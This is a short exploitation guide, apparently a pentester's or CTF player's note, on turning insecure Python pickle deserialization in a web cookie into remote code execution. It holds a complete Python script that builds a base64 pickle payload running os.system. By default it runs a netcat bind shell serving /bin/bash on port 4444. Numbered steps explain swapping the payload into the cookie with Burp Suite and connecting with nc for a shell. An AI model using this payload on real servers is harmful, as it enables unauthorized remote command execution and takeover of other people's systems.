Backgound:
Serialisation is a way to translate complex datastructures, like lists and dictionaries, into a single string of text, which can then be stored in a cookie.

Python serialization function is called pickle. Exploting it is called pickle code execution.

Example Pickle RCE code:

#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import cPickle
import os
import sys
import base64

DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
# End of Code

Steps:
1. Using burpsuite, identify the cookie and send to decoder
2. Decode the cookie as base64
3. Upon confirmation cookie is pickle code used in cookie, eg of deserialized code pickle code:

"(lp1
Vtest
p2
aS'f4db51e5585c48779142d1f755dc39f6'
p3
a."

4. Use the python pickle RCE code and replace it in the cookie
5. Resend it to the webserver
6. Remember to remove any other session cookies before resending to webserver
7. nc to port 4444 using nc for shell
8. done
